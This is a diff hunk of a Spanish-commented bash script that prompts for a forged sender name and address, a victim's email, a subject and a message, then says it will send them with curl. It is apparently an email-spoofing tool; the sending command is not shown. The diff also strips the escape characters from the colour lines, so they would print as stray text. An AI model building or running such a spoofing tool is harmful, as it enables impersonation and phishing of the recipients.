@@ -80,27 +80,27 @@ sleep 1
 read -p       " [!] Coloca El Nombre De Quien Envia El Email [ ] : "  name
 echo 
 # Ahora agregare otro read que corresponde para ingresar el email de quien lo envie a este read le asignare la variable correo
-echo -e "\033[43;320m ------------------------------------------------------------------------------------------------------------------------"
+echo -e "[43;320m ------------------------------------------------------------------------------------------------------------------------"
 echo
 read -p "[?] Coloca Un Correo true o False [ ] :  " correo
 echo
-echo -e "\033[43;320m ------------------------------------------------------------------------------------------------------------------------"
+echo -e "[43;320m ------------------------------------------------------------------------------------------------------------------------"
 echo
 #Ahora asignare otro read para ingresar el correo de la victima
 read -p "[_] Coloca El Correo De la victima [ ] : " victima
 echo
 #Ahora asignaremos otro read para ingresarm el tema del email'
 echo
-echo -e "\033[43;320m ------------------------------------------------------------------------------------------------------------------------"
+echo -e "[43;320m ------------------------------------------------------------------------------------------------------------------------"
 echo
 read -p "[ ] ....Tema.... [ ] : " tema
 echo
-echo -e "\033[43;320m ------------------------------------------------------------------------------------------------------------------------"
+echo -e "[43;320m ------------------------------------------------------------------------------------------------------------------------"
 echo
 # y Finalizamos con el read para ingresar el mensaje 
 read -p "...[Mensaje .. ].. : " mensaje
 echo
-echo -e "\033[43;320m ------------------------------------------------------------------------------------------------------------------------"
+echo -e "[43;320m ------------------------------------------------------------------------------------------------------------------------"
 echo
 # Ahora vamos a usar curl... este sirve para la transferencia de archivos u descargas etc...
 # bien usaremos --data para indicar q mandaremos valores
